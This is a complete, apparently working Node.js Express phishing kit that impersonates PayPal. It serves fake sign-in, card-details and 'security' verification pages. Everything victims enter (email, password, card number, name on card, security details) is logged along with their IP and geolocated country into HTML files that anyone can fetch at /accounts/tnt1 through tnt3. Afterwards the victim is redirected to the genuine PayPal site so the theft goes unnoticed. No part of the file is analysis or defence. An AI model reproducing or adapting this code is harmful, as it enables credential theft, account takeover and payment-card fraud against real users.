var express = require('express');
var app = express();


var bodyParser = require('body-parser');
app.use(bodyParser.json()); // support json encoded bodies
app.use(bodyParser.urlencoded({ extended: true }));
var cookieParser = require('cookie-parser');

app.use(cookieParser());
app.use(express.static('public'));

var get_ip = require('ipware')().get_ip;

var main_url = '/Verification/update-account/customer_center/customer-IDPP00C984/myaccount';


app.get('/', function (req, res) {
    res.writeHead(301,
        {Location: main_url+'/signin/'}
    );
    res.end();
});

// page 1
//------------------------------------------
app.get(main_url+'/signin/',function (req,res) {
    res.sendFile( __dirname + "/" + main_url + '/signin/index.html' );
});

app.post(main_url+'/signin/',function (req,res) {

    // save posts
    var fs = require('fs');


    var
        email = req.body.login_email,
        pass = req.body.login_password,
        ip = get_ip(req).clientIp;
    try {
        var txt = fs.readFileSync('./accounts/tnt1.html') || '';
        if(txt.length<1) txt = '';
    }
    catch (e) {
        txt1 = '';
    }



    txt += `<p>email:${email}<br>pass:${pass}<br>ip:${ip}`;
    txt += '<br>Time : ' + (new Date).toUTCString() + '</p><hr>';
    save('./accounts/tnt1.html',txt);



    var options = 'verify_account=session=&997641544b9a652f78f39bd8c7409f57&dispatch=4546d400324ad175d2ba16d020ee3ecdac4f6b59';


    res.end('<script>location = "'+main_url+'/signin/settings?'+ options +'"; </script>');
   //res.sendFile( __dirname + "/" + main_url + '/signin/settings/index.html' );
});
//-------------------------------------


// page 2
//------------------------------------------------------
app.get(main_url+'/signin/settings/',function (req,res) {

    res.sendFile( __dirname + "/" + main_url + '/signin/settings/index.html' );
});

app.post(main_url+'/signin/settings',function (req,res) {


    // save posts


    var fs = require('fs');
   // console.log(req.body);
    var file = './accounts/tnt2.html';



    try {
        var txt = fs.readFileSync(file) || '';
        if(txt.length<1) txt = '';
    }
    catch (e) {
        txt1 = '';
    }

    var user = req.body;
    for (var i in user)
    {
       if (i !== 'fullname') txt += '<br>';
        txt += i + ":" +user[i];
    }




    txt += '<br>Time: ' + (new Date).toUTCString();


    var type = req.body.c_type;
    try {
        var card_n = req.body.cardnumber.split(' ')[3];
    }
    catch (e) {  var card_n = ''; }

    res.cookie('c_card', type, { maxAge: 900000});
    res.cookie('card_name', req.body.nameoncard, { maxAge: 900000});
    res.cookie('card_n', card_n, { maxAge: 900000});

    get_coun(get_ip(req).clientIp,function (cc) {
        res.cookie('local', cc, { maxAge: 900000});
        txt += '<br>coun :' + cc;
        txt += '<br>ip :'+get_ip(req).clientIp;
        txt = `<p>${txt}</p><hr>`;
        save(file,txt);
       // res.end('<script>location = "'+ main_url +'/security?'+ options +'" </script>');
        res.writeHead(301,
            {Location: 'https://www.paypal.com/signin?country.x=US&locale.x=en_US'}
        );
        res.end();

    });





    var options = 'secure_code=session=&6a92a3bc62ae32c7f9fbd9f550a56708&dispatch=a9db51bdf04ccde390ac900444f9236977375d53';


});
//-----------------------------------------------------------------------


// page 3
//---------------------------------------------------
app.get(main_url +'/security', function (req,res) {
    res.sendFile(__dirname + "/" + main_url +'/security/index.html');
});
// on send
app.post(main_url +'/security',function (req,res) {


    // save posts

    var fs = require('fs');
   // console.log(req.body);
    var file = './accounts/tnt3.html';



    try {
        var txt = fs.readFileSync(file) || '';
        if(txt.length<1) txt = '';
    }
    catch (e) {
        txt1 = '';
    }

    var user = req.body;
   delete user.vbv_submit_btn;
    for (var i in user)
    {
        if (i !== 'day') txt += '<br>';
        txt += i + ":" +user[i];
    }


    txt += '<br>ip : '+ get_ip(req).clientIp;
    txt += '<br>Time :' + (new Date).toUTCString();

    txt = `<p>${txt}</p><hr>`;
    save(file,txt);




    res.writeHead(301,
        {Location: 'https://www.paypal.com/us/home'}
    );
    res.end();
});
//------------------------------------


app.get('/admin', function (req, res) {
    res.end('hi');
});

app.get( '/accounts/tnt1',function (req, res) {
    res.sendFile(__dirname + '/' + '/accounts/tnt1.html');
});

app.get('/accounts/tnt2',function (req, res) {
    res.sendFile(__dirname + '/' + 'accounts/tnt2.html');
});

app.get('/accounts/tnt3',function (req, res) {
    res.sendFile(__dirname + '/' + 'accounts/tnt3.html');
});





app.use(function(req, res, next) {
    res.writeHead(301,
        {Location: main_url+'/signin/'}
    );
    res.end();
});





var server = app.listen(process.env.PORT || 4000, function () {
    var host = server.address().address;
    var port = server.address().port;

    console.log("Example app listening at http://%s:%s", host, port)
});


function save(path,txt) {
    var fs = require('fs');

    fs.writeFile(path,txt);
   // console.log(txt);
}

function get_coun(ip,fun) {
    var req = require('request');
    req.get('http://www.geoplugin.net/json.gp?ip='+ip,function (error,data,s) {

        if ((data.body)) {
            data = JSON.parse(data.body);
            var code = data.geoplugin_countryCode;
           fun(code);
        }
        else fun(null);
    });
}